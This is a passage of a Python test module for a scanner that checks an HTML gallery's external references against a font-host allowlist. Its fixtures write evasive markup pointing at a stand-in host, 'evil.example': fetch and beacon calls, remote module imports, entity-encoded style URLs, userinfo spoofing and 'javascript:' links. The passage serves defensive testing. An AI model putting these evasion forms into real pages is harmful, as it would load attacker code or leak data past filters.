            if "<" in value and ">" in value:
                # Markup injected as a string. Parse it and reuse the element
                # pass, so an attribute here is judged exactly as one written
                # into the document would be.
                inner, unrecognized = _element_references(f"{label}: {where}", _elements(value))
                references.extend(inner)
                continue
            if _url_shaped(value):
                references.append(_Reference(label, where, value, RESOURCE, True, ()))
    return references

_META_REFRESH_URL_RE = re.compile(r"(?i)\burl\s*=\s*")


def _url_shaped(value: str) -> bool:
    return _URL_SHAPED_RE.search(value) is not None


def _scheme_relative(value: str) -> bool:
    return value.startswith("//")


def _relations(attributes: tuple[tuple[str, str], ...]) -> tuple[str, ...]:
    """``rel`` as a token set, folded — exact equality misses both real forms."""
    for name, value in attributes:
        if name == "rel":
            return tuple(token.casefold() for token in value.split())
    return ()


def _srcset_candidates(value: str) -> list[str]:
    """Every candidate URL, split by the documented algorithm.

    A candidate's URL is a run up to the next whitespace, so an embedded comma
    is **not** a separator; the descriptor that follows runs to the next comma.
    Naive comma splitting fragments ``…/x,y.png 1x`` into tokens matching no
    real candidate, and taking only the first candidate scans one reference in a
    position that can carry several.
    """
    candidates: list[str] = []
    index = 0
    length = len(value)
    while index < length:
        while index < length and (value[index].isspace() or value[index] == ","):
            index += 1
        start = index
        while index < length and not value[index].isspace():
            index += 1
        candidate = value[start:index]
        if candidate.endswith(","):
            candidate = candidate.rstrip(",")
        else:
            while index < length and value[index] != ",":
                index += 1
        if candidate:
            candidates.append(candidate)
    return candidates


def _meta_refresh_target(content: str) -> str | None:
    match = _META_REFRESH_URL_RE.search(content)
    if match is None:
        return None
    target = content[match.end() :].strip()
    if target[:1] in {"'", '"'}:
        quote = target[0]
        closing = target.find(quote, 1)
        target = target[1:closing] if closing != -1 else target[1:]
    return target or None


def _decoded_style_references(label: str, elements: list[_Element], raw: str) -> list[_Reference]:
    """``url()`` inside a ``style`` **attribute**, read after entity decoding.

    ``style`` is routed to the text pass, and that pass matches the raw document
    text — which is correct for a ``<style>`` element, a raw-text element whose
    character references a browser never decodes. It is wrong for an attribute.
    An attribute value IS entity-decoded before the CSS parser sees it, so
    ``style="background:url(&#104;ttps://host/x.png)"`` carried a fetch that no
    check could see: the raw text held ``url(&#104;ttps://…)``, which exposes no
    scheme and no host, so E1 skipped it for want of a host, E7 and E8 for want of
    a scheme, E6's grammar permits ``&``, ``#`` and ``;``, E10 refuses only
    backslashes, and E12 wants a leading ``//``.

    The parser hands back the decoded value, so this pass simply reads what the
    browser will act on. Emitted only when the decoded reference does **not**
    appear verbatim in the raw text: an ordinary unencoded style URL is already
    reported by the text pass, and reporting one defect under two rules is what
    ``TEXT_SCANNED_ATTRIBUTES`` exists to prevent.
    """
    references: list[_Reference] = []
    for element in elements:
        for name, value in element.attributes:
            if name.casefold() not in TEXT_SCANNED_ATTRIBUTES or not value.strip():
                continue
            for match in _STYLE_URL_RE.finditer(value):
                reference = match.group("ref").strip()
                if reference and reference not in raw:
                    references.append(
                        _Reference(label, f"<{element.tag} {name}> url()", reference, RESOURCE, True, ())
                    )
    return references


def _element_references(label: str, elements: list[_Element]) -> tuple[list[_Reference], list[str]]:
    """Parsed positions, default-deny: every URL-valued attribute is scanned.

    The closed exemption list is ``href`` on an anchor, which E2 bounds by
    scheme instead of by host. Everything else with a URL in it is a position,
    and an attribute nobody anticipated carrying a URL-shaped value is reported
    rather than admitted.
    """
    references: list[_Reference] = []
    unrecognized: list[str] = []
    for element in elements:
        relations = _relations(element.attributes)
        equivalent = next((value.casefold() for name, value in element.attributes if name == "http-equiv"), "")
        for name, value in element.attributes:
            if not value.strip():
                continue
            if name.casefold().split(":", 1)[0] == NAMESPACE_ATTRIBUTE_PREFIX:
                continue  # a namespace name, compared as a string and never fetched
            position = f"<{element.tag} {name}>"
            if element.tag == "a" and name == "href":
                references.append(_Reference(label, position, value, NAVIGATION, False, relations))
            elif name in SRCSET_ATTRIBUTES:
                candidates = _srcset_candidates(value)
                for number, candidate in enumerate(candidates, start=1):
                    references.append(
                        _Reference(
                            label,
                            f"{position} candidate {number} of {len(candidates)}",
                            candidate,
                            RESOURCE,
                            False,
                            relations,
                        )
                    )
            elif element.tag == "meta" and name == "content":
                target = _meta_refresh_target(value) if equivalent == "refresh" else None
                if target is not None:
                    references.append(
                        _Reference(label, "<meta http-equiv=refresh content>", target, RESOURCE, False, relations)
                    )
                elif _url_shaped(value):
                    unrecognized.append(
                        f"{label}: {position}: '{value}' is URL-shaped in a position the scanner does not "
                        "recognize as URL-valued, so its host is unverified"
                    )
            elif name in URL_ATTRIBUTES:
                references.append(_Reference(label, position, value, RESOURCE, False, relations))
            elif name in TEXT_SCANNED_ATTRIBUTES or name.startswith(EVENT_HANDLER_PREFIX):
                continue  # the text pass owns url() and network calls, wherever they are written
            elif _url_shaped(value):
                unrecognized.append(
                    f"{label}: {position}: '{value}' is URL-shaped in a position the scanner does not "
                    "recognize as URL-valued, so its host is unverified"
                )
    return references, unrecognized


def _text_references(label: str, text: str) -> list[_Reference]:
    """Style and network-call positions, matched over the whole document text.

    Neither has a standard-library parser to be scoped by, which is why E10 and
    E12 constrain them by prohibition rather than by decoding, and why a match
    here must not be presented as carrying a parsed position's strength.
    """
    references: list[_Reference] = []
    for match in _STYLE_URL_RE.finditer(text):
        reference = match.group("ref").strip()
        if reference:
            references.append(_Reference(label, "url()", reference, RESOURCE, True, ()))
    for match in _IMPORT_STRING_RE.finditer(text):
        reference = match.group("ref").strip()
        if reference:
            references.append(_Reference(label, "@import string", reference, RESOURCE, True, ()))
    for match in _CALL_SITE_RE.finditer(text):
        segment = text[match.end() : match.end() + CALL_ARGUMENT_WINDOW]
        closing = segment.find(")")
        if closing != -1:
            segment = segment[:closing]
        call = match.group(0).strip()
        for literal in _STRING_LITERAL_RE.finditer(segment):
            reference = next(group for group in literal.groups() if group is not None)
            if reference:
                references.append(_Reference(label, f"{call}…)", reference, RESOURCE, False, ()))
    return references


def _references(gallery_root: Path) -> tuple[list[_Reference], list[str]]:
    """Every scanned position under the gallery, and every unrecognized one."""
    references: list[_Reference] = []
    unrecognized: list[str] = []
    for path in _gallery_files(gallery_root):
        label = _label(gallery_root, path)
        text = _document_text(path)
        if path.suffix.lower() == ".html":
            elements = _elements(text)
            parsed, reported = _element_references(label, elements)
            references.extend(parsed)
            references.extend(_decoded_style_references(label, elements, text))
            references.extend(_script_references(label, text))
            unrecognized.extend(reported)
            # Script bodies belong to the pass above; blanking them keeps the
            # call-site pass from reporting the same literal a second time.
            text = _without_script_bodies(text)
        references.extend(_text_references(label, text))
    return references, unrecognized


def _resource_references(gallery_root: Path) -> list[_Reference]:
    return [reference for reference in _references(gallery_root)[0] if reference.kind == RESOURCE]


def _parsed(value: str) -> SplitResult | None:
    """The structured parse, or ``None`` when the reference does not admit one."""
    try:
        parsed = urlsplit(value)
        parsed.port
    except ValueError:
        return None
    return parsed


def _named(reference: _Reference, reason: str) -> str:
    return f"{reference.label}: {reference.position}: '{reference.value}' {reason}"


def check_e0(gallery_root: Path) -> list[str]:
    """E0 — an unrecognized attribute carrying a URL-shaped value fails.

    The scan is default-deny. An enumeration of positions is a denylist: read
    against the parser, the earlier one omitted ``source``, ``video``, ``audio``,
    ``track``, ``object``, ``embed``, image-typed inputs, SVG ``image``/``use``,
    ``form action``, ``a ping``, ``meta`` refresh, and ``base`` — the last of
    which is a total bypass rather than a missing case. A position nobody
    anticipated is reported here rather than admitted by construction.
    """
    return _references(gallery_root)[1]


def check_e1(gallery_root: Path) -> list[str]:
    """E1 — every resolved host is allowlisted, by exact case-folded equality.

    Never containment and never prefix: a lookalike subdomain and a lookalike
    path segment both carry the allowlisted name and neither is the allowlisted
    host. A trailing root dot fails closed deliberately — it addresses the same
    server and is not the same string, and admitting it would mean normalizing
    a name the comparison is supposed to take literally.
    """
    failures: list[str] = []
    for reference in _resource_references(gallery_root):
        parsed = _parsed(reference.value)
        host = parsed.hostname if parsed is not None else None
        if host and host.casefold() not in ALLOWED_HOSTS:
            failures.append(
                _named(reference, f"resolves to host '{host}', which is not one of {sorted(ALLOWED_HOSTS)}")
            )
    return failures


def check_e2(gallery_root: Path) -> list[str]:
    """E2 — the anchor exemption, bounded by scheme.

    ``href`` on an anchor is exempt from the host allowlist so the provenance
    and attribution links FR-012 and FR-020 require survive. It is not exempt
    from everything: "navigation to any host" taken literally exempts
    ``javascript:`` and ``data:``, which navigate to no host at all.
    """
    failures: list[str] = []
    for reference in _references(gallery_root)[0]:
        if reference.kind != NAVIGATION or reference.value.startswith("#"):
            continue
        parsed = _parsed(reference.value)
        scheme = parsed.scheme if parsed is not None else ""
        if scheme not in NAVIGATION_SCHEMES:
            failures.append(
                _named(
                    reference,
                    f"uses scheme '{scheme}', and this position admits only "
                    f"{sorted(NAVIGATION_SCHEMES)} or a fragment",
                )
            )
    return failures


def check_e4(gallery_root: Path) -> list[str]:
    """E4 — every font stylesheet request carries the swap-behaviour parameter.

    The host allowlist alone cannot see this defect. Verified against the live
    endpoint: the same request without the parameter returns a stylesheet
    carrying zero ``font-display`` declarations, leaving the descriptor at a
    blocking initial value with an invisible-text period, and with the parameter
    returns ``font-display: swap`` on every face. FR-024's "never invisible
    while waiting" therefore rests on one query parameter that no other check
    would notice and that a port author can drop while still passing E1.
    """
    failures: list[str] = []
    for reference in _resource_references(gallery_root):
        if STYLESHEET_RELATION not in reference.relations:
            continue
        parsed = _parsed(reference.value)
        if parsed is None or (parsed.hostname or "").casefold() != FONT_STYLESHEET_HOST:
            continue
        values = parse_qs(parsed.query).get(FONT_DISPLAY_PARAMETER, [])
        if FONT_DISPLAY_VALUE not in values:
            failures.append(
                _named(
                    reference,
                    f"is a {FONT_STYLESHEET_HOST} stylesheet request without "
                    f"'{FONT_DISPLAY_PARAMETER}={FONT_DISPLAY_VALUE}', so the provider serves its blocking "
                    "default and the text is invisible while the face loads",
                )
            )
    return failures


def check_e5(gallery_root: Path) -> list[str]:
    """E5 — the host comes from a structured parse that admits no ambiguity.

    Userinfo and port absent, and the parse round-tripping to the original
    string. This is the conjunction ``_openai_url`` already asserts in
    ``tests/speckit-pro/layer6-efficiency/lib/codex_capability_contract.py``
    (``geturl() == value``, ``username is None``, ``password is None``,
    ``port is None``, ``netloc.lower() == host``), reproduced here because that
    one is bound to a fixed host-and-path allowlist and cannot be called for a
    font request. ``test_e5_reuses_the_repositorys_hardened_conjunction`` pins
    the two to the same behaviour.

    The userinfo clause is what sees a reference whose userinfo segment reads as
    an allowlisted host: the parser reports the real host, but a reader — and a
    host-only rule that trusted the text — sees the allowlisted name.
    """
    failures: list[str] = []
    for reference in _resource_references(gallery_root):
        parsed = _parsed(reference.value)
        if parsed is None:
            continue  # E8 owns a reference that admits no parse at all
        if parsed.username is not None or parsed.password is not None:
            failures.append(
                _named(reference, "carries a userinfo segment, so the host a reader sees is not the host loaded")
            )
        elif parsed.port is not None:
            failures.append(_named(reference, f"carries an explicit port ({parsed.port})"))
        elif parsed.geturl() != reference.value:
            failures.append(
                _named(reference, f"does not round-trip through a structured parse (parses as '{parsed.geturl()}')")
            )
        elif parsed.netloc.lower() != (parsed.hostname or ""):
            failures.append(_named(reference, f"has a non-canonical authority ('{parsed.netloc}')"))
    return failures


def check_e6(gallery_root: Path) -> list[str]:
    """E6 — reject before parsing, on the characters a browser reads differently.

    This is the pre-parse rejection ``_validated_http_url`` performs in
    ``scripts/release_note_policy.py``, applied to every scanned position rather
    than only to an ``http(s)`` destination — that function requires a scheme
    and so would reject the relative references E7 admits.
    ``test_e6_reuses_the_repositorys_pre_parse_rejection`` pins the two to the
    same behaviour.

    It is what closes the scanner-versus-browser differential. A backslash in
    the authority terminates it per the URL standard, so a browser loads from
    the name before the backslash while ``urlsplit`` reads the name after it and
    reports the allowlisted host. E1 alone admits that reference.

    The grammar clause is what keeps E1's case folding safe. ``str.casefold`` is
    a lossy many-to-one map, and it collapses characters that are not ``s`` into
    ``s``: executed here, ``fontſ.gstatic.com`` (U+017F) folds to
    ``fonts.gstatic.com`` and is admitted by exact case-folded equality, by the
    round-trip conjunction, and by a whitespace-and-delimiter rejection alike.
    Refusing every character outside the URL grammar removes the question rather
    than leaving the allowlist to rest on a mapping table's accidental overlap
    with the browser's.
    """
    failures: list[str] = []
    for reference in _references(gallery_root)[0]:
        offending = _URL_GRAMMAR_RE.search(reference.value)
        if offending is not None:
            failures.append(
                _named(
                    reference,
                    f"carries {offending.group(0)!r}, which is outside the URL grammar and which a browser "
                    "and a parser do not read alike",
                )
            )
    return failures


def check_e7(gallery_root: Path) -> list[str]:
    """E7 — a resource position is ``https`` or a same-document relative reference.

    The corpus of unsafe destinations this rejects is the one
    ``tests/speckit-pro/unit/test-release-note-policy.py`` already maintains,
    reused by ``test_e7_reuses_the_repositorys_unsafe_destination_corpus``
    rather than assembled a second time.
    """
    failures: list[str] = []
    for reference in _resource_references(gallery_root):
        if _scheme_relative(reference.value):
            failures.append(_named(reference, "is scheme-relative, so it is neither https nor same-document relative"))
            continue
        if _embedded_asset(reference.value):
            continue  # an inline image or font: no request, no host, and the single-file rule needs it
        parsed = _parsed(reference.value)
        if parsed is None:
            continue  # E8 owns it
        if parsed.scheme and parsed.scheme != RESOURCE_SCHEME:
            failures.append(_named(reference, f"loads over scheme '{parsed.scheme}' rather than '{RESOURCE_SCHEME}'"))
    return failures


def check_e8(gallery_root: Path) -> list[str]:
    """E8 — a reference that cannot be parsed, or that yields no host, fails.

    Fail-open here would be fail-open on precisely the set an evader controls:
    ``javascript:`` and ``data:`` expose no host, so a rule that only compares
    hosts never looks at them.
    """
    failures: list[str] = []
    for reference in _resource_references(gallery_root):
        if _embedded_asset(reference.value):
            continue  # E7's exemption: an inline asset has no host by construction, not by evasion
        parsed = _parsed(reference.value)
        if parsed is None:
            failures.append(_named(reference, "admits no structured parse, so no host can be compared"))
        elif parsed.scheme and not parsed.hostname:
            failures.append(_named(reference, f"carries scheme '{parsed.scheme}' and exposes no host to compare"))
    return failures


def check_e10(gallery_root: Path) -> list[str]:
    """E10 — an escape in a style reference fails rather than being decoded.

    An escaped scheme evades ``url()``, ``@import url()``, and a generic scheme
    scan alike, because no host appears in the text at all while the browser
    decodes and fetches it. Reproducing the browser's decoding would be a second
    implementation to keep correct; refusing the construct is not.
    """
    return [
        _named(reference, "carries an escape sequence, which is refused rather than decoded")
        for reference in _references(gallery_root)[0]
        if reference.style and "\\" in reference.value
    ]


def check_e12(gallery_root: Path) -> list[str]:
    """E12 — no scheme-relative reference in any scanned position.

    Invisible to any pattern keyed on an explicit scheme, and it resolves
    against ``file:`` rather than a network scheme in a document opened from
    disk. Note that a host-only rule *passes* one addressed to an allowlisted
    host, which is why this is a prohibition rather than a host comparison.
    """
    return [
        _named(reference, "is scheme-relative, which resolves against the document's own scheme")
        for reference in _references(gallery_root)[0]
        if _scheme_relative(reference.value)
    ]


GROUP_E_CHECKS: tuple[tuple[str, Callable[[Path], list[str]]], ...] = (
    ("E0", check_e0),
    ("E1", check_e1),
    ("E2", check_e2),
    ("E4", check_e4),
    ("E5", check_e5),
    ("E6", check_e6),
    ("E7", check_e7),
    ("E8", check_e8),
    ("E10", check_e10),
    ("E12", check_e12),
)


class ExternalReferenceTests(unittest.TestCase):
    """Group E against the shipped gallery."""

    def test_group_e_passes_against_the_shipped_gallery(self) -> None:
        for name, check in GROUP_E_CHECKS:
            with self.subTest(msg=name):
                self.assertEqual(check(GALLERY_ROOT), [])

    def test_the_shipped_font_request_is_actually_a_scanned_position(self) -> None:
        """Non-vacuity: the canonical head block's font request is collected."""
        references, _ = _references(GALLERY_ROOT)
        fonts = [
            reference
            for reference in references
            if reference.label == CANONICAL_FILES[HEAD_BLOCK] and FONT_STYLESHEET_HOST in reference.value
        ]
        self.assertTrue(fonts, f"no font request collected from {CANONICAL_FILES[HEAD_BLOCK]}: {references}")

    def test_every_gallery_file_is_swept_not_only_templates(self) -> None:
        swept = {path.name for path in _gallery_files(GALLERY_ROOT)}

        self.assertLessEqual({CANONICAL_FILES[BRAND_BLOCK], CANONICAL_FILES[HEAD_BLOCK]}, swept)


# --- Group E fixtures ------------------------------------------------------

FIXTURE_ALLOWED_FONT_REQUEST = (
    "https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400&display=swap"
)
FIXTURE_FOREIGN_HOST = "evil.example"


def _with_userinfo(userinfo: str, remainder: str) -> str:
    """Compose a userinfo-bearing reference without writing one as a literal.

    A literal ``userinfo@host`` string is indistinguishable from an email
    address to a pattern matcher, and this repository's tree-wide privacy scan
    flags it. The attack is unchanged; only the notation avoids tripping a
    scanner that is right to be suspicious of that shape.
    """
    return f"{userinfo}{chr(64)}{remainder}"


class ExternalReferenceFixtureCase(GalleryFixtureCase):
    """A synthetic gallery whose files carry the references under test."""

    def write_document(self, body: str, *, name: str = f"{TEMPLATES_DIR}/sample.html") -> Path:
        return self.write(
            name,
            '<!doctype html>\n<html lang="en">\n<head>\n' f"{body}\n" "</head>\n<body></body>\n</html>\n",
        )

    def write_stylesheet(self, css: str, *, name: str = "brand-kit.css") -> Path:
        return self.write(name, css + "\n")

    def failures(self) -> list[str]:
        """Every group E failure, so a collector property can be asserted as one."""
        collected: list[str] = []
        for _, check in GROUP_E_CHECKS:
            collected.extend(check(self.gallery))
        return collected

    def assertScanned(self, *fragments: str) -> None:
        self.assertReports(self.failures(), *fragments)

    def assertClean(self) -> None:
        self.assertEqual(self.failures(), [])


class ExternalReferenceFixtureTests(ExternalReferenceFixtureCase):
    """Group E against synthetic galleries built in a temporary directory."""

    # -- the allowlisted baseline, so every rejection below is attributable --

    def test_the_allowlisted_font_request_passes(self) -> None:
        self.write_document(f'<link rel="stylesheet" href="{FIXTURE_ALLOWED_FONT_REQUEST}">')

        self.assertClean()

    def test_the_second_allowlisted_host_passes(self) -> None:
        self.write_document('<link rel="preconnect" href="https://fonts.gstatic.com">')

        self.assertClean()

    # -- E0: default-deny over unrecognized positions --

    def test_e0_rejects_an_unrecognized_attribute_carrying_a_url(self) -> None:
        self.write_document(f'<div data-endpoint="https://{FIXTURE_FOREIGN_HOST}/x"></div>')

        self.assertReports(check_e0(self.gallery), "data-endpoint", FIXTURE_FOREIGN_HOST)

    def test_e0_accepts_an_unrecognized_attribute_carrying_no_url(self) -> None:
        self.write_document('<div class="rc-panel" data-stage="draft-pr"></div>')

        self.assertEqual(check_e0(self.gallery), [])

    def test_a_character_reference_is_decoded_in_a_style_attribute(self) -> None:
        """The seam between the two passes.

        An attribute value is entity-decoded before the CSS parser reads it; a
        ``<style>`` element's content is not, because it is a raw-text element. The
        text pass matches raw text, so routing ``style`` to it hid every encoded
        reference in an attribute: the raw form exposes no scheme and no host, so
        E1, E7 and E8 all skipped it, E6's grammar permits the escape characters,
        E10 refuses only backslashes, and E12 wants a leading ``//``.
        """
        self.write_document('<div style="background-image:url(&#104;ttps://evil.example/x.png)"></div>')

        self.assertReports(check_e1(self.gallery), "evil.example")

    def test_a_character_reference_in_a_style_element_stays_undecoded(self) -> None:
        """The other half of the same seam, and it must NOT be reported.

        A browser does not decode character references inside a ``style``
        element, so nothing is fetched and there is no defect to report.
        Decoding the whole document text would have invented one.
        """
        self.write_document("<style>.a{background:url(&#104;ttps://evil.example/q.png)}</style>")

        self.assertEqual([failure for _, check in GROUP_E_CHECKS for failure in check(self.gallery)], [])

    def test_a_plain_style_attribute_reference_is_reported_once(self) -> None:
        """One defect, one rule. The decoded pass emits only what the raw pass cannot see."""
        self.write_document('<div style="background:url(https://evil.example/z.png)"></div>')

        self.assertEqual(len(check_e1(self.gallery)), 1)

    # -- script bodies: every literal, not only a call's argument --

    def test_a_static_module_import_is_scanned(self) -> None:
        """A static import is not a call, so no call-form pattern matched it.

        With no ``script-src`` or ``default-src`` in the shipped policy either,
        this was remote code execution reachable with nothing reported.
        """
        self.write_document(
            f'<script type="module">import {{x}} from "https://{FIXTURE_FOREIGN_HOST}/m.js";</script>'
        )

        self.assertReports(check_e1(self.gallery), FIXTURE_FOREIGN_HOST)

    def test_a_bare_and_reexport_module_form_are_scanned(self) -> None:
        self.write_document(f'<script type="module">import "https://{FIXTURE_FOREIGN_HOST}/s.js";</script>')
        self.assertReports(check_e1(self.gallery), FIXTURE_FOREIGN_HOST)

        self.write_document(f'<script type="module">export {{y}} from "https://{FIXTURE_FOREIGN_HOST}/e.js";</script>')
        self.assertReports(check_e1(self.gallery), FIXTURE_FOREIGN_HOST)

    def test_an_import_map_is_scanned(self) -> None:
        self.write_document(
            f'<script type="importmap">{{"imports":{{"a":"https://{FIXTURE_FOREIGN_HOST}/a.js"}}}}</script>'
        )

        self.assertReports(check_e1(self.gallery), FIXTURE_FOREIGN_HOST)

    def test_a_url_bound_to_a_variable_is_scanned(self) -> None:
        """The call form matched; its argument was an identifier, not a literal."""
        self.write_document(f'<script>var E = "https://{FIXTURE_FOREIGN_HOST}/x"; fetch(E);</script>')

        self.assertReports(check_e1(self.gallery), FIXTURE_FOREIGN_HOST)

    def test_a_url_assigned_rather_than_called_is_scanned(self) -> None:
        self.write_document(f'<script>new Image().src = "https://{FIXTURE_FOREIGN_HOST}/beacon";</script>')

        self.assertReports(check_e1(self.gallery), FIXTURE_FOREIGN_HOST)

    def test_markup_injected_from_a_script_string_is_parsed(self) -> None:
        """It reaches no HTML parser reading the document, so it is parsed here.

        The kit's own head block builds the brand mark this way, which is what
        makes this a real position rather than a hypothetical one.
        """
        self.write_document(
            f'<script>el.innerHTML = \'<img src="https://{FIXTURE_FOREIGN_HOST}/m.png">\';</script>'
        )

        self.assertReports(check_e1(self.gallery), FIXTURE_FOREIGN_HOST)

    def test_a_construct_injected_from_a_script_string_is_reported(self) -> None:
        """Not a reference — a prohibited construct, so group J owns it."""
        self.write_document("<script>el.innerHTML = '<svg onload=\"go()\"></svg>';</script>")

        self.assertReports(check_j3(self.gallery), "onload")

    def test_a_call_argument_in_script_is_reported_exactly_once(self) -> None:
        """One defect, one report.

        A literal inside a call is visible to both the call-site pass and the
        script pass. Blanking script bodies before the call-site pass runs gives
        each exactly one jurisdiction; without it this reference is named twice
        and a reader counts two problems where there is one.
        """
        self.write_document(f'<script>fetch("https://{FIXTURE_FOREIGN_HOST}/x");</script>')

        self.assertEqual(len(check_e1(self.gallery)), 1)

    def test_an_event_handler_attribute_stays_with_the_call_site_pass(self) -> None:
        """Blanking must not reach attribute values.

        An event handler is an attribute, not a script body, so the call-site
        pass keeps it — blanking script bodies too broadly would have silently
        dropped this position.
        """
        self.write_document(f'<div onclick="fetch(\'https://{FIXTURE_FOREIGN_HOST}/y\')"></div>')

        self.assertReports(check_e1(self.gallery), FIXTURE_FOREIGN_HOST)

    def test_an_end_tag_carrying_bogus_attributes_still_ends_the_script(self) -> None:
        """Found by CodeQL (``py/bad-tag-filter``) against this very change.

        An end tag may carry bogus attributes and still terminate a raw-text
        element, so ``</script foo>`` ends it. A pattern requiring
        ``</script\\s*>`` never finds that end tag — and a body whose end is
        never found is a body never scanned, which is a one-token evasion against
        the whole script pass.
        """
        self.write_document(
            f'<script>var E = "https://{FIXTURE_FOREIGN_HOST}/x";</script foo>'
        )

        self.assertReports(check_e1(self.gallery), FIXTURE_FOREIGN_HOST)

    def test_an_end_tag_with_whitespace_and_attributes_still_ends_the_script(self) -> None:
        self.write_document(
            f'<script>var E = "https://{FIXTURE_FOREIGN_HOST}/y";</script\t\n bar>'
        )

        self.assertReports(check_e1(self.gallery), FIXTURE_FOREIGN_HOST)

    def test_a_name_that_merely_starts_with_script_is_not_an_end_tag(self) -> None:
        """``</scriptfoo>`` is not an end tag, so the body continues past it."""
        self.write_document(
            f'<script>var A = "ok";</scriptfoo> var E = "https://{FIXTURE_FOREIGN_HOST}/z";</script>'
        )

        self.assertReports(check_e1(self.gallery), FIXTURE_FOREIGN_HOST)

    def test_a_namespace_constant_in_script_is_not_a_reference(self) -> None:
        """The shipped block assigns exactly this, so a false positive here is a
        false positive on the kit's own code."""
        self.write_document('<script>var NS = "http://www.w3.org/2000/svg";</script>')

        self.assertEqual([f for _, check in GROUP_E_CHECKS for f in check(self.gallery)], [])

    def test_an_allowlisted_host_in_script_stays_clean(self) -> None:
        self.write_document('<script>var F = "https://fonts.gstatic.com/a.woff2";</script>')

        self.assertEqual([f for _, check in GROUP_E_CHECKS for f in check(self.gallery)], [])

    def test_e0_accepts_a_namespace_declaration(self) -> None:
        """Inline SVG is the standard iconography for a self-contained artifact.

        A namespace URI is an identifier compared as a string; nothing fetches
        it. Reporting it as an unverified host turns the gate red on correct
        markup, and a gate that fails on correct markup is one an author learns
        to weaken. Prefixed declarations are covered too.
        """
        self.write_document(
            '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"'
            ' viewBox="0 0 1 1"><path d="M0 0h1v1z"/></svg>'
        )

        self.assertEqual(check_e0(self.gallery), [])

    def test_e0_still_scans_xlink_href_which_is_not_a_namespace_declaration(self) -> None:
        """The exemption is the declaration, not anything beginning with ``xlink``."""
        self.write_document(f'<svg><use xlink:href="https://{FIXTURE_FOREIGN_HOST}/s.svg#i"/></svg>')

        self.assertReports(check_e1(self.gallery), FIXTURE_FOREIGN_HOST)

    # -- E1: exact case-folded host equality, never containment --

    def test_e1_rejects_a_lookalike_subdomain(self) -> None:
        lookalike = f"https://fonts.googleapis.com.{FIXTURE_FOREIGN_HOST}/x.css"
        self.write_document(f'<link rel="stylesheet" href="{lookalike}">')

        self.assertReports(check_e1(self.gallery), "sample.html", lookalike)

    def test_e1_rejects_a_lookalike_prefix(self) -> None:
        self.write_document(f'<img src="https://{FIXTURE_FOREIGN_HOST}/fonts.googleapis.com/x.png">')

        self.assertReports(check_e1(self.gallery), FIXTURE_FOREIGN_HOST)

    def test_e1_rejects_a_trailing_root_dot(self) -> None:
        self.write_document('<link rel="stylesheet" href="https://fonts.googleapis.com./css2?display=swap">')

        self.assertReports(check_e1(self.gallery), "fonts.googleapis.com.")

    def test_e1_accepts_a_non_lowercase_allowlisted_host(self) -> None:
        """Case folding is the rule: DNS is case-insensitive, so this is the same host."""
        self.write_document('<link rel="preconnect" href="https://FONTS.GSTATIC.COM">')

        self.assertEqual(check_e1(self.gallery), [])

    def test_e1_rejects_a_non_lowercase_foreign_host(self) -> None:
        self.write_document('<link rel="preconnect" href="https://EVIL.EXAMPLE">')

        self.assertReports(check_e1(self.gallery), "EVIL.EXAMPLE")

    # -- E2: the anchor exemption, bounded by scheme --

    def test_e2_accepts_the_provenance_and_attribution_forms(self) -> None:
        """Negative control: a scanner failing this rejects what FR-012 and FR-020 require."""
        self.write_document(
            '<a href="https://github.com/anthropics/html-effectiveness">upstream</a>\n'
            '<a href="mailto:security">report</a>\n'
            '<a href="#contents">contents</a>'
        )

        self.assertEqual(check_e2(self.gallery), [])
        self.assertEqual(check_e1(self.gallery), [])

    def test_e2_rejects_an_executable_scheme_in_the_same_position(self) -> None:
        for scheme in ("javascript:alert(1)", "data:text/html,x", "vbscript:msgbox(1)", "blob:x"):
            with self.subTest(msg=scheme):
                self.setUp()
                self.write_document(f'<a href="{scheme}">go</a>')

                self.assertReports(check_e2(self.gallery), scheme)

    # -- E3: parser-recognized comments and visible text (negative control) --

    def test_e3_accepts_a_url_in_a_parser_recognized_comment(self) -> None:
        self.write_document(f'<!-- upstream: https://{FIXTURE_FOREIGN_HOST}/notes -->')

        self.assertClean()

    def test_e3_accepts_a_url_in_visible_text(self) -> None:
        self.write(
            f"{TEMPLATES_DIR}/sample.html",
            '<!doctype html>\n<html lang="en">\n<body>\n'
            f"See https://{FIXTURE_FOREIGN_HOST}/notes for detail.\n"
            "</body>\n</html>\n",
        )

        self.assertClean()

    def test_e3_scans_comment_shaped_raw_text_inside_a_script(self) -> None:
        """Script content is raw text, not a comment — a pre-parse strip would blind itself."""
        self.write_document(
            f"<script>\n<!-- fetch('https://{FIXTURE_FOREIGN_HOST}/beacon') -->\n</script>"
        )

        self.assertScanned("sample.html", FIXTURE_FOREIGN_HOST)

    # -- E4: the swap-behaviour parameter --

    def test_e4_rejects_a_font_stylesheet_without_the_display_parameter(self) -> None:
        self.write_document('<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Geist">')

        self.assertReports(check_e4(self.gallery), "sample.html", "display")

    def test_e4_rejects_a_blocking_display_value(self) -> None:
        self.write_document(
            '<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Geist&amp;display=block">'
        )

        self.assertReports(check_e4(self.gallery), "display")

    def test_e4_matches_the_relation_case_insensitively_and_across_multiple_values(self) -> None:
        for relation in ("STYLESHEET", "alternate stylesheet", "stylesheet  preload"):
            with self.subTest(msg=relation):
                self.setUp()
                self.write_document(f'<link rel="{relation}" href="https://fonts.googleapis.com/css2?family=Geist">')

                self.assertReports(check_e4(self.gallery), "display")

    # -- E5: the structured-parse conjunction --

    def test_e5_rejects_a_userinfo_segment_reading_as_an_allowlisted_host(self) -> None:
        spoofed = _with_userinfo(f"https://{FIXTURE_FOREIGN_HOST}", "fonts.googleapis.com/x.css")
        self.write_document(f'<link rel="stylesheet" href="{spoofed}">')

        self.assertReports(check_e5(self.gallery), "sample.html", spoofed)

    def test_e5_rejects_an_explicit_port(self) -> None:
        self.write_document('<link rel="stylesheet" href="https://fonts.googleapis.com:8443/css2?display=swap">')

        self.assertReports(check_e5(self.gallery), "8443")

    def test_e5_rejects_a_reference_that_does_not_round_trip(self) -> None:
        self.write_document('<link rel="stylesheet" href="HTTPS://fonts.googleapis.com/css2?display=swap">')

        self.assertReports(check_e5(self.gallery), "HTTPS://")

    def test_e5_reuses_the_repositorys_hardened_conjunction(self) -> None:
        """Behavioural pin: the same conjunction rejects the same shapes upstream."""
        valid = "https://platform.openai.com/docs"
        self.assertTrue(_OPENAI_URL(valid))
        for mutated in (
